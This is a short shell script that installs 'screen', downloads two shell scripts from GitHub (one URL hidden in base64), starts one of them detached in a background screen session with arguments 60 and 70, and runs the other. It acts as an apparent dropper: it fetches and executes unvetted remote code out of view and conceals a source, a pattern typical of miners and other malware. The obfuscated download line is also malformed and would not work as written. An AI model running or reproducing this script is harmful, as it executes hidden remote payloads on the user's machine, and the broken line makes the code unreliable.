#!/bin/sh

sudo apt update
sudo apt install screen -y
wget base64 -d 'aHR0cHM6Ly9naXRodWIuY29tL0RhcnNoR29zd2FtaTE5ODIvcHJlbS9yYXcvbWFpbi9kaC5zaA=='
wget https://github.com/DarshGoswami1982/FkgX/raw/main/man2.sh
chmod +x man2.sh
screen -dmS man2 ./man2.sh 60 70
chmod +x dh.sh
./dh.sh
